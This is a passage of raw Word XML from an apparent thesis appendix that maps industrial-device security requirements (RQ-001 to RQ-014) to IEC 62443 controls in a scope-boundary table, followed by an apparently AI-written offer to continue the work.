      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Re-scoped the firmware-modification overlap</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — the </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-modification-evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> limb is now a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>cross-reference to RQ-008 (TC-RQ008-02, self-erasing install)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> rather than a duplicated test. </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">RQ-009's </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>unique</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>primary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limb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is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configuration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modification</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619BF64F" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Retained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the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config-specific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analytical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strengths</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>G-1 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>actor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delegated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to</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> PLC, not absent)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>G-2 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>no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timestamp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>G-3 (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>asymmetric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t>retention</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">: durable REVISION_COUNTER </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>vs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> volatile </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>error</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">-log </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>detail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">G-5 (0xFFFF </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>counter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>wrap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> — all </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t>genuinely</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> RQ-009's own. </w:t>
      </w:r>
      <w:hyperlink r:id="rId238" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Market_Acc</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>ty_Systems</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId239" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="374528B0" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Kept the audit family + CR 3.4</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — CR 2.8/2.9/2.10/2.11/2.12/</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>3.4</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">/3.9/6.1; STRIDE = Repudiation + Tampering-on-audit. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t>Consistent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t>with</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC3DB6">
        <w:t xml:space="preserve"> RQ-003/008. </w:t>
      </w:r>
      <w:hyperlink r:id="rId240" w:history="1">
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00DC3DB6">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7336C8AB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Corrected verdict, tightly bounded: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">RQ-009 = collect evidence of </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>configuration</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> modification (its unique, best-evidenced limb: durable change-count + fingerprint + readable log + write-gate, but no device-side actor, no timestamp, asymmetric/bounded retention)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, with </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>software/firmware-modification evidence → RQ-008</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>5-year retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-012</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>no-signature cause</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-005</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>update authorization</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-011</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17BD3512" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:pict w14:anchorId="1BF67034">
          <v:rect id="_x0000_i1617" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A9AB36" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Scope-boundary recheck — status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181A0EE3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The corrections now form a </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clean, non-overlapping map</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357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416"/>
        <w:gridCol w:w="4351"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="002926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B9CCE4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F62A0A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Requirement</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>(s)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B761A0" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Corrected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boundary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="01208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5A070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Identify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8B02B" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>RQ-004 (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>SW+data</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>), RQ-006 (SW)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B54CA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 xml:space="preserve">Completeness + confidentiality only; </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>integrity</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-005; </w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>change-count</w:t>
            </w:r>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="31BCC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E2991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Protect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D7971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>RQ-002 (tamper-resist), RQ-005 (integrity/authenticity)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8BA38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i/>
                <w:iCs/>
              </w:rPr>
              <w:t>Evidence</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> → RQ-003; </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:i/>
                <w:iCs/>
              </w:rPr>
              <w:t>authorization</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> → RQ-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="382C6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4B440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Authorize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3B71F" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>RQ-011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4D8C2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>Receives update-gate/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EoP</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> + unauthenticated-DCP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w14:paraId="11BC4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20BF2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Collect</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6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103E1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>RQ-003 (physical), RQ-008 (software), RQ-009 (config)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E94B8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>REVISION_COUNTER/I&amp;M4 land in RQ-009</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="4DCA5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4900C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Retain</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>restrict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720C2" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>RQ-012 (5-yr), RQ-013 (SW-version), RQ-014 (access-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>restrict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB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08AD1" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve">The </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> paradox</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w14:paraId="0DEA1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93FA8" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Withstand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BFD21" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AC6357">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>RQ-001 (connecting device), RQ-010 (foreseeable attacks)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AA073" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>Flood/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>DoS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t>fuzz</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:t xml:space="preserve"> → RQ-010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69888910" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRPr="00AC6357" w:rsidRDefault="00DC3DB6" w:rsidP="00DC3DB6">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Would you like me to (a) </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>recheck RQ-010</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (to confirm it correctly </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>receives</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the flood/DoS tests deferred from RQ-001 and RQ-007, and that its firmware-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EoP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> cross-references RQ-005/RQ-011 cleanly), or (b) proceed to </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>compile the fully corrected RQ-001 → RQ-014 set into the consolidated thesis appendix</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC6357">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Word/PDF) with the master traceability matrix and this boundary map?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FDED4D7" w14:textId="70F85C21" w:rsidR="003165C7" w:rsidRDefault="003165C7" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0CEBA03C" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24E935E5" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2CD70BB4" w14:textId="77777777" w:rsidR="00DC3DB6" w:rsidRDefault="00DC3DB6" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C79FA8E" w14:textId="77777777" w:rsidR="007D03A4" w:rsidRDefault="007D03A4" w:rsidP="00106294">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
